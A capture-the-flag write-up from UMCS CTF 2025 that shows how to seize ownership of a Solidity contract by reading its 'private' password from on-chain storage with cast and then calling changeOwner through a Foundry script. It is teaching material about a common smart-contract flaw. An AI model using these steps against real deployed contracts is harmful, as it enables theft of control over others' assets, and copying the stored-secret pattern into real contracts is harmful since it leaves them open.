# 🚩 Secure Shell – Easy

- **Category:** Blockchain
- **CTF Event:** UMCS CTF 2025
- **Difficulty:** Easy

---

## Challenge Files

- [`SecureShell.sol`](src/SecureShell.sol)
- [`Setup.sol`](src/Setup.sol)

---

## Objective

### `Setup.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "./SecureShell.sol";

contract Setup {
    SecureShell public secureShell;

    constructor(uint256 _password) {
        secureShell = new SecureShell(_password);
    }

    function isSolved() public view returns (bool) {
        return secureShell.owner() == msg.sender;
    }
}
```

The main goal is to become the owner of `secureShell` as required in the `isSolved()` function in the `Setup` contract.

---

## Code Analysis

### `SecureShell.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

contract SecureShell {
    address public owner;
    uint256 private secretPassword;
    uint256 public accessLevel;
    uint256 public securityPatches;
    
    constructor(uint256 _password) {
        owner = msg.sender;
        secretPassword = _password;
        accessLevel = 0;
        securityPatches = 0;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }
    
    function changeOwner(uint256 _password, address _newOwner) public {
        require(_password == secretPassword, "Incorrect password");
        owner = _newOwner;
    }
    
    function requestAccess(uint256 _accessCode) public returns (bool) {
        if (_accessCode == 31337) {
            accessLevel++;
            return true;
        } else {
            return false;
        }
    }
    
    function pingServer() public view returns (uint256) {
        return uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender))) % 1000;
    }
    
    function updateSecurity() public onlyOwner {
        securityPatches++;
    }
}
```

In this `SecureShell.sol` file, we can observe that there's a function called `changeOwner()` which required the caller to call it with the correct password in order to change the owner of the contract. Thus, as long as we know the correct password, we are able to change the owner. We can see that the `secretPassword` is stored in the storage which is actually public even it used a `private` keyword, as in the context of blockchain, it is publicly visible as a on-chain data. The `private` keyword would use to only prevent other contracts from reading it.

---

## Exploitation

The key to this challenge is the `changeOwner()` function, which lets anyone become the contract owner if they provide the correct password. Although the password is marked as private, all contract storage is publicly accessible on-chain. We can simply read the secretPassword value directly from storage using tools like `cast` or `ethers.js`. However, I'm using the `cast` tool in Foundry:

```bash
cast storage 1 --rpc-url $RPC_URL
```

We check the slot `1` in the contract storage as the `secretPassword` in stored at slot `1`. Slot `0` was storing the value of `owner` as it is declared as address which takes up to `20` bytes, `secretPassword` is declared as `32` bytes which will need to be stored at the next slot as each slot can only store up to a `32` bytes. If the size of `secretPassword` in bytes is `12`, it will be stored at slot `0`, combining with the value of `owner`.

Once you have the password, call changeOwner() with our address to take ownership and solve the challenge.

```solidity
SecureShell public secureShell;
function run() external {
    vm.startBroadcast();
    secureShell = SecureShell(vm.envAddress("SS"));
    secureShell.changeOwner(13377331, vm.envAddress("WALLET"));
    vm.stopBroadcast();
}
```

See the full exploitation script [here](script/Exploit.s.sol).

### Command to Deploy the Script

```bash
forge script script/Exploit.s.sol:Exploit --broadcast --rpc-url $RPC_URL --private-key $PK
```

Please kindly save the variables in the `.env` file. However, and please don't save your private key in plaint text in production!

---